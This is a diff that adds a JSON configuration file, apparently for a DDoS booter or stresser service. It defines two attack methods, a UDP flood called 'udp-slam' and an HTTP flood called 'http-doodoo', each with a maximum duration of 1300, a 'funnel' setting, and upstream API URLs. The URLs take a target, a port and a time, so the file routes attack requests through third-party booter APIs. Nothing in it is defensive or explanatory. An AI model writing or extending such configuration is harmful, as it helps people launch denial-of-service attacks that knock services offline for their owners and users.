@@ -1,0 +1,27 @@
+{
+    "udp-slam": {
+        "about": "UDP method",
+        "maxtime": 1300,
+
+        "funnel": true,
+        "api": [
+            "https://paraly.sys/api?key=TESTKEY12377717171&target=$(target)&port=$(port)&time=$(time)&method=udp-slam",
+            "https://some.shitty.api/api?key=TESTKEY12377717171&target=$(target)&port=$(port)&time=$(time)&method=udp-slam"
+        ],
+
+        "syntax": "udp-slam ip port time"
+    },
+
+    "http-doodoo": {
+        "about": "HTTP method",
+        "maxtime": 1300,
+
+        "funnel": true,
+        "api": [
+            "https://paraly.sys/api?key=TESTKEY12377717171&target=$(target)&port=$(port)&time=$(time)&method=http-doodoo",
+            "https://some.shitty.api/api?key=TESTKEY12377717171&target=$(target)&port=$(port)&time=$(time)&method=http-doodoo"
+        ],
+
+        "syntax": "http-doodoo url time"
+    }
+}
